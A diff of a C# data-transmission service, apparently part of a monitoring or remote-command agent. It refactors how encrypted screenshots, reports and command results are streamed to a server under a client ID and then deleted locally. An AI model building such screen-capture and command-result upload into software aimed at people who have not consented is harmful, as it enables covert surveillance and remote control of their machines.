@@ -80,27 +80,31 @@ public class DataTransmissionService : IDataTransmissionService
                 return;
             }
 
-            var fileBytes = await File.ReadAllBytesAsync(filePath);
-            var encryptedData = EncryptData(fileBytes);
-            
-            using var content = new MultipartFormDataContent();
-            var sendName = $"{_settings.ClientId}_{DateTime.UtcNow.ToString("yyyy-MM-ddTHH-mm-ss.fffZ")}.jpg";
-            content.Add(new ByteArrayContent(encryptedData), "screenshot", sendName);
-            content.Add(new StringContent(_settings.ClientId), "clientId");
-            content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
+            using (var streamContent = GetEncryptedStreamContent(fileStream))
+            using (var content = new MultipartFormDataContent())
+            {
+                var sendName = $"{_settings.ClientId}_{DateTime.UtcNow:yyyy-MM-ddTHH-mm-ss.fffZ}.jpg";
+                content.Add(streamContent, "screenshot", sendName);
+                content.Add(new StringContent(_settings.ClientId), "clientId");
+                content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
 
-            var response = await _httpClient.PostAsync("screenshots", content);
-            
-            if (response.IsSuccessStatusCode)
-            {
-                _logger.LogDebug("Screenshot sent successfully: {FilePath}", filePath);
-                try { if (File.Exists(filePath)) File.Delete(filePath); } catch { }
-            }
-            else
-            {
-                _logger.LogWarning("Failed to send screenshot. Status: {StatusCode}", response.StatusCode);
-                var dest = Path.Combine(_pendingScreenshots, Path.GetFileName(filePath));
-                try { File.Move(filePath, dest, true); } catch { }
+                var response = await _httpClient.PostAsync("screenshots", content);
+                
+                if (response.IsSuccessStatusCode)
+                {
+                    _logger.LogDebug("Screenshot sent successfully: {FilePath}", filePath);
+                    // Закрываем поток перед удалением файла
+                    streamContent.Dispose();
+                    fileStream.Dispose();
+                    try { if (File.Exists(filePath)) File.Delete(filePath); } catch { }
+                }
+                else
+                {
+                    _logger.LogWarning("Failed to send screenshot. Status: {StatusCode}", response.StatusCode);
+                    var dest = Path.Combine(_pendingScreenshots, Path.GetFileName(filePath));
+                    try { File.Move(filePath, dest, true); } catch { }
+                }
             }
         }
         catch (Exception ex)
@@ -257,25 +261,29 @@ public class DataTransmissionService : IDataTransmissionService
                 return;
             }
 
-            var fileBytes = await File.ReadAllBytesAsync(reportPath);
-            var encryptedData = EncryptData(fileBytes);
-            
-            using var content = new MultipartFormDataContent();
-            content.Add(new ByteArrayContent(encryptedData), "report", Path.GetFileName(reportPath));
-            content.Add(new StringContent(_settings.ClientId), "clientId");
-            content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+            using (var fileStream = new FileStream(reportPath, FileMode.Open, FileAccess.Read, FileShare.Read))
+            using (var streamContent = GetEncryptedStreamContent(fileStream))
+            using (var content = new MultipartFormDataContent())
+            {
+                content.Add(streamContent, "report", Path.GetFileName(reportPath));
+                content.Add(new StringContent(_settings.ClientId), "clientId");
+                content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
 
-            var response = await _httpClient.PostAsync("reports", content);
-            
-            if (response.IsSuccessStatusCode)
-            {
-                _logger.LogDebug("Report sent successfully: {ReportPath}", reportPath);
-            }
-            else
-            {
-                _logger.LogWarning("Failed to send report. Status: {StatusCode}", response.StatusCode);
-                var dest = Path.Combine(_pendingReports, Path.GetFileName(reportPath));
-                try { File.Move(reportPath, dest, true); } catch { }
+                var response = await _httpClient.PostAsync("reports", content);
+                
+                if (response.IsSuccessStatusCode)
+                {
+                    _logger.LogDebug("Report sent successfully: {ReportPath}", reportPath);
+                    streamContent.Dispose();
+                    fileStream.Dispose();
+                    try { if (File.Exists(reportPath)) File.Delete(reportPath); } catch { }
+                }
+                else
+                {
+                    _logger.LogWarning("Failed to send report. Status: {StatusCode}", response.StatusCode);
+                    var dest = Path.Combine(_pendingReports, Path.GetFileName(reportPath));
+                    try { File.Move(reportPath, dest, true); } catch { }
+                }
             }
         }
         catch (Exception ex)
@@ -522,15 +530,23 @@ public class DataTransmissionService : IDataTransmissionService
             {
                 try
                 {
-                    var fileBytes = await File.ReadAllBytesAsync(file);
-                    var encrypted = EncryptData(fileBytes);
-                    using var content = new MultipartFormDataContent();
-                    var sendName = $"{_settings.ClientId}_{DateTime.UtcNow.ToString("yyyy-MM-ddTHH-mm-ss.fffZ")}.jpg";
-                    content.Add(new ByteArrayContent(encrypted), "screenshot", sendName);
-                    content.Add(new StringContent(_settings.ClientId), "clientId");
-                    content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
-                    var resp = await _httpClient.PostAsync("screenshots", content);
-                    if (resp.IsSuccessStatusCode) File.Delete(file);
+                    using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
+                    using (var streamContent = GetEncryptedStreamContent(fileStream))
+                    using (var content = new MultipartFormDataContent())
+                    {
+                        var sendName = $"{_settings.ClientId}_{DateTime.UtcNow:yyyy-MM-ddTHH-mm-ss.fffZ}.jpg";
+                        content.Add(streamContent, "screenshot", sendName);
+                        content.Add(new StringContent(_settings.ClientId), "clientId");
+                        content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                        var resp = await _httpClient.PostAsync("screenshots", content);
+                        
+                        if (resp.IsSuccessStatusCode) 
+                        {
+                            streamContent.Dispose();
+                            fileStream.Dispose();
+                            File.Delete(file);
+                        }
+                    }
                 }
                 catch { }
             }
@@ -539,14 +555,22 @@ public class DataTransmissionService : IDataTransmissionService
             {
                 try
                 {
-                    var fileBytes = await File.ReadAllBytesAsync(file);
-                    var encrypted = EncryptData(fileBytes);
-                    using var content = new MultipartFormDataContent();
-                    content.Add(new ByteArrayContent(encrypted), "report", Path.GetFileName(file));
-                    content.Add(new StringContent(_settings.ClientId), "clientId");
-                    content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
-                    var resp = await _httpClient.PostAsync("reports", content);
-                    if (resp.IsSuccessStatusCode) File.Delete(file);
+                    using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
+                    using (var streamContent = GetEncryptedStreamContent(fileStream))
+                    using (var content = new MultipartFormDataContent())
+                    {
+                        content.Add(streamContent, "report", Path.GetFileName(file));
+                        content.Add(new StringContent(_settings.ClientId), "clientId");
+                        content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                        var resp = await _httpClient.PostAsync("reports", content);
+                        
+                        if (resp.IsSuccessStatusCode) 
+                        {
+                            streamContent.Dispose();
+                            fileStream.Dispose();
+                            File.Delete(file);
+                        }
+                    }
                 }
                 catch { }
             }
@@ -602,12 +626,18 @@ public class DataTransmissionService : IDataTransmissionService
                     if (parts.Length >= 3)
                     {
                         var cmdId = parts[1];
-                        var jsonBytes = await File.ReadAllBytesAsync(file);
-                        var encrypted = EncryptData(jsonBytes);
-                        using var content = new ByteArrayContent(encrypted);
-                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
-                        var resp = await _httpClient.PostAsync($"commands/{cmdId}/json", content);
-                        if (resp.IsSuccessStatusCode) File.Delete(file);
+                        using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
+                        using (var streamContent = GetEncryptedStreamContent(fileStream))
+                        {
+                            streamContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
+                            var resp = await _httpClient.PostAsync($"commands/{cmdId}/json", streamContent);
+                            if (resp.IsSuccessStatusCode) 
+                            {
+                                streamContent.Dispose();
+                                fileStream.Dispose();
+                                File.Delete(file);
+                            }
+                        }
                     }
                 }
                 catch { }
@@ -622,14 +652,21 @@ public class DataTransmissionService : IDataTransmissionService
                     if (parts.Length >= 3)
                     {
                         var cmdId = parts[1];
-                        var fileBytes = await File.ReadAllBytesAsync(file);
-                        var encrypted = EncryptData(fileBytes);
-                        using var content = new MultipartFormDataContent();
-                        content.Add(new ByteArrayContent(encrypted), "file", Path.GetFileName(file));
-                        content.Add(new StringContent(_settings.ClientId), "clientId");
-                        content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
-                        var resp = await _httpClient.PostAsync($"commands/{cmdId}/result", content);
-                        if (resp.IsSuccessStatusCode) File.Delete(file);
+                        using (var fileStream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
+                        using (var streamContent = GetEncryptedStreamContent(fileStream))
+                        using (var content = new MultipartFormDataContent())
+                        {
+                            content.Add(streamContent, "file", Path.GetFileName(file));
+                            content.Add(new StringContent(_settings.ClientId), "clientId");
+                            content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                            var resp = await _httpClient.PostAsync($"commands/{cmdId}/result", content);
+                            if (resp.IsSuccessStatusCode) 
+                            {
+                                streamContent.Dispose();
+                                fileStream.Dispose();
+                                File.Delete(file);
+                            }
+                        }
                     }
                 }
                 catch { }
